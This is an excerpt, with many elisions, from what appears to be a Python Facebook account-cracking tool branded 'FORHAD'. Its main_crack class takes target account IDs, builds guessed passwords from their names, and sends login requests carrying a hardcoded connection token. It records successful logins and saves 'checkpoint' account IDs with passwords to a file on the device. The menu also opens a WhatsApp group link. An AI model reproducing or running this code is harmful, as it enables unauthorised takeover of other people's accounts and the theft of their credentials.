...
sys.stdout.write('\x1b]2; FORHAD\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            FORHAD
\033[1;37m Facebook:            FORHAD
\033[1;37m Github  :            FORHAD1315
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/KUBMM9eDWYH7KqYGvWXpy2/')
        pass
    elif select =='F':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {F}[FORHAD] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{F} [FORHAD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    ...
                    break
                     ...
                     cps.append(sid)
                     open('/sdcard/FORHAD_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {F}[FORHAD] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
